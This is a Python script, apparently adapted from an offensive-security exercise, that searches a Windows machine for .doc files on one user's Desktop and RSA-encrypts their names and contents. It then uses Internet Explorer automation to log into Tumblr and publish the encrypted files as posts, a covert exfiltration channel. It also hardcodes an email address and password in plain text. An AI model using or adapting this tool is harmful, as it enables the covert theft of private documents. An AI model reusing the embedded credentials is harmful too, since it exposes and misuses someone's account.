import win32com.client
import os
import fnmatch
import time
import random
import zlib
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "ufcbrendan1@gmail.com"
password = "Gr4nd3r_123!@*"

public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs8rrdhb7JB+oQMBi8ZnB\nno5B6tT/shrBc8sxjiN/DMdG8Jo3+g091PHe4uYXDtssPGbstnYnCS7rT4rmCW4o\n31fawaxZymOM3ys/HOVzuOMlWVQG+8UxC7+OJmepKWbDW9lrjfbt5mtN4QQBJNtA\nRoMMS7c35WVijscSoXqR2cs63jCLSFEeBLiui3sVHhZI2Bi+eYn2TtYj7B6sqjE4\nOtMksCSTp+uVGLwmhgVN0xxMtlHGVlOjML91JRcFOOZQB2bC7buQW61VZmPWTDGy\n5QbQJNbn9rgxVVlQunk1wbiJ7V0zEjmsz8dlBTE0ijmrGxUOj1tfCJspRlw6rbJU\nSwIDAQAB\n-----END PUBLIC KEY-----"


def wait_for_browser(browser):

    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return

def encrypt_String(plaintext):
    chunk_size = 200
    print(type(plaintext))
    if isinstance(plaintext, str):
        print("[*] Changing string %s to bytes" % plaintext)
        plaintext_as_bytes = str.encode(plaintext)
        print("[*] Compressing: %d bytes" % len(plaintext))
        plain_text = zlib.compress(plaintext_as_bytes)
    else:
        print("[*] Compressing: %d bytes" % len(plaintext))
        plain_text = zlib.compress(plaintext)

    print("[*] Encrypting %d bytes" % len(plain_text))

    rsakey = RSA.import_key(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = b""
    offset = 0

    while offset < len(plain_text):

        chunk = plain_text[offset:offset+chunk_size]

        if len(chunk) % chunk_size != 0:
            print(str(len(chunk)))
            chunk += str.encode(" " * (chunk_size - len(chunk)))
            print(str(len(chunk)))

        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    encrypted = base64.b64encode(encrypted)

    print("Base64 encoded crypto: %d" % len(encrypted))

    return encrypted


def encrypt_post(filename):

    # open and read the file
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_String(filename)
    encrypted_body = encrypt_String(contents)

    return encrypted_title, encrypted_body


def random_sleep():
    time.sleep(random.randint(5, 10))
    return


def login_to_tumblr(ie):

    # retrieve all elements int he document
    full_doc = ie.Document.all

    # iterate looking for the login form
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_determine_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)
        elif i.id == "signup_forms_submit":
            print("Found Next button")
            post_form = i
            i.focus()
            post_form.children[0].click()

    random_sleep()

    full_doc = ie.Document.all
    for i in full_doc:
        if i.id == "signup_magiclink":
            post_form = i
            post_form.children[1].click()


    random_sleep()
    try:
        # you can be presented with different home pages
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError as e:
        pass

    random_sleep()

    # the login form is the second form on the page
    wait_for_browser(ie)
    return


def post_to_tumblr(ie, title, post):

    full_doc = ie.Document.all

    for i in full_doc:
        if i.style == "min-height: 42px;":
            i.setAttribute("innerHTML", title)
            title_box = i
            i.focus()
        elif i.style == "min-height: 80px;":
            i.setAttribute("innerHTML", post)
            print("Set text area")
            i.focus()
        elif i.id == "create_post":
            print("Found post button")
            post_form = i
            i.focus()

    # move focus away from the main content box
    random_sleep()
    title_box.focus()
    random_sleep()

    # post the form
    post_form.children[0].click()
    wait_for_browser(ie)

    random_sleep()

    return


def exfiltrate(document_path):

    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    # head to tumblr and login
    ie.Navigate("https://tumblr.com/login")
    wait_for_browser(ie)

    print("[*] Logging into Tumblr")
    login_to_tumblr(ie)
    print("[*] Logged in...")

    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    # encrypt the file
    title, body = encrypt_post(document_path)

    print("Creating new post...")
    post_to_tumblr(ie, title, body)
    print("Posted!")

    # destroy the IE instance
    ie.Quit()
    ie = None

    return

# main loop for document discovery
# NOTE: no tab for first line of code below
for parent, directories, filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        if parent == "C:\\Users\\bortiz\\Desktop":
            document_path = os.path.join(parent, filename)
            print("Found: %s" % document_path)
            exfiltrate(document_path)
            input("Continue?")
        else:
            continue
